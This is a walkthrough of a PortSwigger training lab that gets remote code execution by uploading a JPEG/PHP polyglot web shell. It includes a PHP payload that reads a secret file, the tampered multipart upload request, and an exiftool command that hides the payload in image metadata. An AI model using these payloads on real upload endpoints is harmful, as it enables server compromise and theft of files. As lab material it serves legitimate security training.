# [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

> uploading a image with php as a comment in the metadata

- boot up burp suite
- log in
- upload an image (any small image)
- go back to the profile page
- check the burp suite proxy history (turn filters off if necessary)
- there is a request for the image upload `/my-account/avatar`
- there is a request for the image for avatar `/files/avatars/image.jpg`
- send both to the repeater

> upload exploit

- check the `/my-account/avatar` in the repeater

```
POST /my-account/avatar HTTP/2
...
------WebKitFormBoundaryk8j5XzBtGCT4dMop
Content-Disposition: form-data; name="avatar"; filename="black.jpg"
Content-Type: image/jpeg

<image data>

------WebKitFormBoundaryk8j5XzBtGCT4dMop
...
```

- update the image header and data to

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- send it
- the server will respond

```
HTTP/2 403 Forbidden
...
Error: file is not a valid image
...
```

- the server checks the uploaded file if it is a valid image by checking its content

> create a `polyglot` PHP/JPG file

**to create a `polyglot` image file you will need the `exiftool` program on yor system**

**a `polyglot` image is a valid image and something else too, simultaneously another file format or a script**

- "merge" the basic image and the exploit in one file

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" black.jpg -o polyglot.php
```

- this wil generate a `polyglot.php` file that is actually an image but in the metadata there will be a the exploit as a comment
- upload this `polyglot.php` file as an avatar
- check the `/files/avatars/polyglot.php`
- in the response there will be a `START xxx END` section the `xxx` is the exploit resolution
